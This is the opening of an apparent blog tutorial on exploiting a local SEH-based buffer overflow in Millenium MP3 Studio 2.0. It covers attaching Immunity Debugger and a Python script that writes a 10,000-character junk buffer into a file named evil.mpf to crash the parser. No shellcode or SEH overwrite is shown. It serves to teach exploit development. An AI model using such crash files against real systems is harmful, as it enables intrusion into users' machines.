---
layout: single
title: Local SEH overflow exploitation - Millenium MP3 Studio 2.0
---

**Getting started**

Start by attaching an immunity debugger to the running MP3 Studio process.

![local seh 1](localseh1.png)

The basic concept for exploiting a local structured exception Handler based buffer overflow is that you will create a malicious text file that includes the payload that you were going to manually enter into a vulnerable input field, or instead of a text file, you will generate a malicious payload embedded within something other than a text file, for example this target application includes a buffer overflow when parsing certain types of data files, with an .mpf file extension, we will generate our malicious payload.

We can start the exploitation process by creating a basic python script that opens up a new file, and inputs a large buffer of data into it.

```python
from struct import *

malicious_file = "evil.mpf"

payload = "A" * 10000

try:
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating a file named", malicious_file) 
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
except:
    print("[!] Error creating the exploit")
```
